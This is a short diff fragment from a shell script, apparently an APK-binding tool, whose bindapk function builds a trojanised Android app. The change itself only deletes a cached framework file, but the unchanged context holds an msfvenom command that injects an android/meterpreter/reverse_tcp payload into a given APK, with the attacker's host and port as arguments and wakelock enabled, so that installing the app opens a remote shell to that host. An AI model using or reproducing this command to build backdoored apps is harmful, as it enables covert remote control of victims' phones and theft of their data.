@@ -158,6 +158,8 @@ bindapk() {
         aapt_arg="--use-aapt"
     fi
 
+    rm -f $HOME/.apkmod/framework/1.apk
+
 	msfvenom -x ${3} -p android/meterpreter/reverse_tcp LHOST=${1} LPORT=${2} --platform android --arch dalvik AndroidMeterpreterDebug=true AndroidWakelock=true ${aapt_arg} -o ${4}
 
 	if [ ! -e ${4} ]; then
